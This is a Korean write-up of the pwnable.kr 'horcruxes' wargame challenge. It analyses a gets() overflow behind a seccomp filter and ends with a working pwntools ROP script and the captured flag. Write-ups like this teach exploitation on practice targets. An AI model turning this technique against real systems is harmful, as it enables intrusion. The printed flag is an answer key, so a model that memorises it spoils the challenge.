# [pwnable.kr] horcruxes writeup



```shell
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

뭔지는 모르겠는데 ROP 문제인 것 같다.

```shell
horcruxes@ubuntu:~$ cat readme 
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.
```

localhost 9032에 돌아가는 서비스를 대상으로 공격을 진행해야하는듯

대충 아래와 같이 동작하는 프로그램이다.

```shell
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:0
How many EXP did you earned? : 1
You'd better get more experience to kill Voldemort
```



처음에 그냥 어셈블리로 분석하다가 seccomp가 나오길래 scp이용해서 바이너리 땡겨와서 IDA로 살펴봤다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int context; // ST1C_4

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  context = seccomp_init(0);
  seccomp_rule_add(context, 2147418112, 173, 0);// sys_rt_sigreturn
  seccomp_rule_add(context, 2147418112, 5, 0);  // sys_open
  seccomp_rule_add(context, 2147418112, 3, 0);  // sys_read
  seccomp_rule_add(context, 2147418112, 4, 0);  // sys_write
  seccomp_rule_add(context, 2147418112, 252, 0);// sys_exit_group
  seccomp_load(context);
  return ropme();
}
```

seccomp를 사용해서 샌드박싱을 하는 걸 볼 수 있다. 디폴트 설정도 하고, `sigreturn`, `open`, `read`, `write`, `exit_group`만 화이트 리스트에 등록한다.

`init_ABCDEFG()`에서는 a, b, c, d, e, f, g 전역변수의 값을 랜덤으로 만들고, 해당 값들의 합을 sum에 저장한다.

```c
unsigned int init_ABCDEFG()
{
  int v0; // eax
  unsigned int result; // eax
  unsigned int buf; // [esp+8h] [ebp-10h]
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  v0 = rand();
  g = -559038737 * v0 % 0xCAFEBABE;
  result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE;
  sum = result;
  return result;
}
```



본 바이너리에서는 이 `ropme()`가 핵심이다. Menu에서 입력한 값에 따라서 여러 함수들을 부르는데 여기서 호크룩스들 및 다음의 루틴과 연결된다. 부르는 함수들 중에는 `A()`, `B()`, `C()`, `D()`, `E()`, `F()`, `G()`가 존재하는데, 각 각 위의 `init_ABCDEFG()`에서 초기화한 값들을 출력한다.

```c
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
```

취약점은 우선 위의 `gets()`에서 buffer overflow가 발생한다. seccomp로 인해 바로 쉘을 딸 수는 없어, flag를 open, read, write 하는 payload를 구성하거나 코드의 가젯들을 사용하면 된다. 

원래 바로 저 if 문 안으로 뛸 수 있을까 싶었는데, 하필 해당 코드 영역 주소에 0x0a가 포함되서 `gets()`로 입력 받을 때 payload가 끊긴다. 

> `gets()`는 stdin으로 0x0a 혹은 EOF를 받을 때까지 입력을 받는다.



같은 맥락으로 `open@plt`, `read@plt`, `puts`를 사용해서 payload를 구성하려 했는데, pop ret가젯 등을 이용해서 stack을 정리하려 하니 쓸만한 pop ret 가젯들 주소에 모두 0x0a이 들어가서 그냥 `A()`, `B()` ... `G()`를 모두 호출하여 exp를 구한 뒤 `ropme()`를 다시 호출해서 맞는 exp 값을 입력하기로 했다. `ropme()` 주소에 0x0a가 들어가서 난항을 겪기도 했는데, `main()`에서 call ropme()로 뛰면 해결된다.



#### Payload

```python
# /usr/bin/python
from pwn import *

context.log_level='debug'

r = remote('127.0.0.1', 9032)
r.recvuntil('Select Menu:')
r.sendline("1")
r.recvuntil('How many EXP did you earned? : ')

payload = 'A'*0x78
payload += p32(0x809fe4b)
payload += p32(0x809fe6a)
payload += p32(0x809fe89)
payload += p32(0x809fea8)
payload += p32(0x809fec7)
payload += p32(0x809fee6)
payload += p32(0x809ff05)
payload += p32(0x0809fffc)

r.sendline(payload)

exp = 0

for i in range(7):
        r.recvuntil('EXP +')
        exp += int(r.recvline()[:-2])

r.recvuntil('Select Menu:')
r.sendline("1")
r.recvuntil('How many EXP did you earned? : ')
r.sendline(str(exp))

r.interactive()
```

#### Result

```shell
horcruxes@ubuntu:/tmp/charlie3$ python sol_horc.py 
[+] Opening connection to 127.0.0.1 on port 9032: Done
[*] Switching to interactive mode
Magic_spell_1s_4vad4_K3daVr4!

```

